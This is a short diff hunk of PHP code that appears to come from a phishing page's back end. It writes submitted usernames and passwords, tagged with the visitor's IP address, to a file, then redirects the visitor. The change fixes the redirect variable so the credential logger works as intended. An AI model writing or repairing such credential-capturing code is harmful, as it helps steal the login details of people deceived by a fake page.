@@ -8,4 +8,4 @@ $line = $username." , ".$password." , By IP".$_SERVER['REMOTE_ADDR']."\n";
 fwrite($f,$line);
 fclose($f);
 
-header("Location: ".return_dir);
+header("Location: ".$return_dir);
